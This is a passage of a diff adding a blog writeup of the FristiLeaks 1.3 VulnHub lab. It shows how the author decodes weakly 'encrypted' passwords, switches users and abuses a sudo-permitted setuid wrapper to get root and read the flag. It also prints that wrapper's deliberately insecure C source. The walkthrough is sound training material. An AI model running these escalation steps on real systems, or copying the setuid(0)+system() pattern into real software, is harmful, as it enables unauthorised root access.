+<span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 admin     admin        176 Sep 22  2015 .bash_profile
+<span class="nt">-rw-r--r--</span><span class="nb">.</span> 1 admin     admin        124 Sep 22  2015 .bashrc
+<span class="nt">-rwxr-xr-x</span>  1 admin     admin      45224 Nov 18  2015 <span class="nb">cat</span>
+<span class="nt">-rwxr-xr-x</span>  1 admin     admin      48712 Nov 18  2015 <span class="nb">chmod</span>
+<span class="nt">-rw-r--r--</span>  1 admin     admin        737 Nov 18  2015 cronjob.py
+<span class="nt">-rw-r--r--</span>  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
+<span class="nt">-rw-r--r--</span>  1 admin     admin        258 Nov 18  2015 cryptpass.py
+<span class="nt">-rwxr-xr-x</span>  1 admin     admin      90544 Nov 18  2015 <span class="nb">df</span>
+<span class="nt">-rwxr-xr-x</span>  1 admin     admin      24136 Nov 18  2015 <span class="nb">echo</span>
+<span class="nt">-rwxr-xr-x</span>  1 admin     admin     163600 Nov 18  2015 egrep
+<span class="nt">-rwxr-xr-x</span>  1 admin     admin     163600 Nov 18  2015 <span class="nb">grep</span>
+<span class="nt">-rwxr-xr-x</span>  1 admin     admin      85304 Nov 18  2015 ps
+<span class="nt">-rw-r--r--</span>  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
+</code></pre></div></div>
+
+<p>There are a couple files that look interesting. Let’s start by analyzing <code class="language-plaintext highlighter-rouge">cryptedpass.txt</code> and <code class="language-plaintext highlighter-rouge">cryptpass.py</code>:</p>
+
+<h4 id="cryptedpasstxt">cryptedpass.txt:</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>cryptedpass.txt
+mVGZ3O3omkJLmy2pcuTq
+</code></pre></div></div>
+
+<h4 id="cryptpasspy">cryptpass.py:</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cat</span> <span class="n">cryptpass</span><span class="p">.</span><span class="n">py</span>
+<span class="c1">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
+</span><span class="kn">import</span> <span class="nn">base64</span><span class="p">,</span><span class="n">codecs</span><span class="p">,</span><span class="n">sys</span>
+
+<span class="k">def</span> <span class="nf">encodeString</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+    <span class="n">base64string</span><span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">codecs</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">base64string</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="s">'rot13'</span><span class="p">)</span>
+
+<span class="n">cryptoResult</span><span class="o">=</span><span class="n">encodeString</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+<span class="k">print</span> <span class="n">cryptoResult</span>
+</code></pre></div></div>
+
+<p>Okay cool. So we have some ciphertext and the funciton that creates it. Let’s unpack what <code class="language-plaintext highlighter-rouge">cryptpass.py</code> is doing.</p>
+
+<ul>
+  <li>First it takes a string (<code class="language-plaintext highlighter-rouge">str</code>) and base64 encodes it. Pretty simple.</li>
+  <li>Next, it uses the <code class="language-plaintext highlighter-rouge">codecs.encode</code> function to perform a rot13 substitution on the base64 encoded text.</li>
+  <li>But wait, what’s the <code class="language-plaintext highlighter-rouge">[::-1]</code> thing attached to the <code class="language-plaintext highlighter-rouge">base64string</code> string? Turns out this is simply reversing the string.</li>
+</ul>
+
+<p>Okay cool… So knowing what the script does, if we simply reverse the steps, we should get the cleartext password. I used the following command to get the cleartext password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/FristiLeaks1.3:<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"mVGZ3O3omkJLmy2pcuTq"</span> | <span class="nb">tr</span> <span class="s1">'[A-Za-z]'</span> <span class="s1">'[N-ZA-Mn-za-m]'</span> | rev | <span class="nb">base64</span> <span class="nt">-d</span>
+thisisalsopw123
+</code></pre></div></div>
+
+<p>Cool, now let’s try logging in as admin using this password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span>su admin
+su admin
+Password: thisisalsopw123
+
+<span class="o">[</span>admin@localhost .secret_admin_stuff]<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>501<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>501<span class="o">(</span>admin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>501<span class="o">(</span>admin<span class="o">)</span>
+<span class="o">[</span>admin@localhost .secret_admin_stuff]<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Nice!</p>
+
+<p>Looking through our home directory there’s still the <code class="language-plaintext highlighter-rouge">whoisyourgodnow.txt</code> file owned by <code class="language-plaintext highlighter-rouge">fristigod</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>whoisyourgodnow.txt
+<span class="o">=</span>RFn0AKnlMHMPIzpyuTI0ITG
+</code></pre></div></div>
+
+<p>Hmm…. Wonder if this uses the same algorithm we just reversed?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/FristiLeaks1.3:<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"=RFn0AKnlMHMPIzpyuTI0ITG"</span> | <span class="nb">tr</span> <span class="s1">'[A-Za-z]'</span> <span class="s1">'[N-ZA-Mn-za-m]'</span> | rev | <span class="nb">base64</span> <span class="nt">-d</span>
+LetThereBeFristi!
+</code></pre></div></div>
+
+<p>Sure does!</p>
+
+<p>Let’s hop over to this user and see what’s in their home directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>admin@localhost ~]<span class="nv">$ </span>su fristigod
+su fristigod
+Password: LetThereBeFristi!
+
+bash-4.1<span class="nv">$ </span><span class="nb">cd</span> ~
+<span class="nb">cd</span> ~
+bash-4.1<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 <span class="nb">.</span>
+drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
+<span class="nt">-rw-------</span>   1 fristigod fristigod  864 Nov 25  2015 .bash_history
+drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
+bash-4.1<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Hmm.. what’s in the <code class="language-plaintext highlighter-rouge">.secret_admin_stuff</code> directory?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> .secret_admin_stuff
+bash-4.1<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 <span class="nb">.</span>
+drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..
+<span class="nt">-rwsr-sr-x</span>  1 root      root      7529 Nov 25  2015 doCom
+bash-4.1<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>An executable named <code class="language-plaintext highlighter-rouge">doCom</code>. Let’s see what happens when we try to run it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./doCom
+Nice try, but wrong user <span class="p">;</span><span class="o">)</span>
+bash-4.1<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Huh. Maybe we need to use some sort of <code class="language-plaintext highlighter-rouge">sudo</code> trick to pass it a certain UID?</p>
+
+<p>Before we get too deep, let’s use <code class="language-plaintext highlighter-rouge">strings</code> to see what’s hiding inside the binary:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings doCom
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+setuid
+<span class="nb">exit
+</span>strcat
+stderr
+system
+getuid
+fwrite
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l<span class="nv">$ </span>L
+t<span class="si">$(</span>L
+|<span class="nv">$0H</span>
+Nice try, but wrong user <span class="p">;</span><span class="si">)</span>
+Usage: ./program_name terminal_command ...
+</code></pre></div></div>
+
+<p>Interesting, looks like it’s using <code class="language-plaintext highlighter-rouge">setuid</code> and is written in C. Let’s check the sudo configuration for <code class="language-plaintext highlighter-rouge">fristigod</code> using <code class="language-plaintext highlighter-rouge">sudo -l</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span> 
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>fristigod: LetThereBeFristi!
+
+Matching Defaults entries <span class="k">for </span>fristigod on this host:
+    requiretty, <span class="o">!</span>visiblepw, always_set_home, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS
+    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1
+    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL
+    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>,
+    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
+
+User fristigod may run the following commands on this host:
+    <span class="o">(</span>fristi : ALL<span class="o">)</span> /var/fristigod/.secret_admin_stuff/doCom
+</code></pre></div></div>
+
+<p>Oh nice, so we can run this script as <code class="language-plaintext highlighter-rouge">fristi</code>. One thing to note here is that the declared script is stored in a different directory than our home directory. It’s in <code class="language-plaintext highlighter-rouge">/var/fristigod/</code>.</p>
+
+<p>Cool, let’s see what happens when we try to run it using sudo:</p>
+
+<p class="box-note"><strong>Note:</strong> make sure to supply the full path when using <code class="language-plaintext highlighter-rouge">sudo -u</code></p>
+
+<h4 id="running-docom-with-sudo--u">Running doCom with sudo -u:</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom
+Usage: ./program_name terminal_command ...
+</code></pre></div></div>
+
+<p>So the output denotes that it takes a terminal command as a positional argument. Okay, let’s try giving it a command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>100<span class="o">(</span><span class="nb">users</span><span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>,502<span class="o">(</span>fristigod<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Oh sweet, we have a UID of 0. Let’s simply <code class="language-plaintext highlighter-rouge">su</code> to root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom su root
+<span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom su root
+<span class="o">[</span>root@localhost fristigod]# <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">whoami
+id</span> <span class="o">&amp;&amp;</span> <span class="nb">whoami
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root
+<span class="o">[</span>root@localhost fristigod]# 
+</code></pre></div></div>
+
+<p>And that’s it! Rooted!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@localhost ~]# <span class="nb">cat </span>fristileaks_secrets.txt
+<span class="nb">cat </span>fristileaks_secrets.txt
+Congratulations on beating FristiLeaks 1.0 by Ar0xA <span class="o">[</span>https://tldr.nu]
+
+I wonder <span class="k">if </span>you beat it <span class="k">in </span>the maximum 4 hours it<span class="s1">'s supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+</span></code></pre></div></div>
+
+<p>Also, if you’re curious why the <code class="language-plaintext highlighter-rouge">doCom</code> binary gives us the root UID instead of <code class="language-plaintext highlighter-rouge">fristi</code>’s UID, we can see via the source code:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cat</span> <span class="n">doCom</span><span class="p">.</span><span class="n">c</span>
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="cp">#define MAX_CMN_LEN 100
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">cmd</span><span class="p">[</span><span class="n">MAX_CMN_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span><span class="p">,</span> <span class="o">**</span><span class="n">p</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">userID</span><span class="p">;</span>
+    <span class="n">userID</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">userID</span> <span class="o">!=</span> <span class="mi">503</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"Nice try, but wrong user ;)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="cm">/*no command specified*/</span>
+    <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Usage: ./program_name terminal_command ..."</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="k">for</span> <span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">" "</span><span class="p">);</span>
+            <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="o">*</span><span class="n">p</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">setuid(0)</code> command issues the root UID, hence why we have direct root. Cool!</p>
 
       </article>
 
@@ -209,7 +798,7 @@
   <span class="sr-only">Share: </span>
 
   
-    <a href="https://twitter.com/intent/tweet?text=Kioptrix+Level+1+Writeup&url=http%3A%2F%2Flocalhost%3A4000%2F2020-08-02-FristiLeaks-1.3%2F"
+    <a href="https://twitter.com/intent/tweet?text=FristiLeaks+1.3+Writeup&url=http%3A%2F%2Flocalhost%3A4000%2F2020-08-02-FristiLeaks-1.3%2F"
       class="btn btn-social-icon btn-twitter" title="Share on Twitter">
       <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
       <span class="sr-only">Twitter</span>
@@ -237,7 +826,7 @@
       <ul class="pagination blog-pager">
         
         <li class="page-item previous">
-          <a class="page-link" href="/2020-07-29-Kioptrix-Level-1.3/" data-toggle="tooltip" data-placement="top" title="Kioptrix Level 1 Writeup">&larr; Previous Post</a>
+          <a class="page-link" href="/2020-07-29-Kioptrix-Level-1.3/" data-toggle="tooltip" data-placement="top" title="Kioptrix Level 1.3 (#4) Writeup">&larr; Previous Post</a>
         </li>
         
         
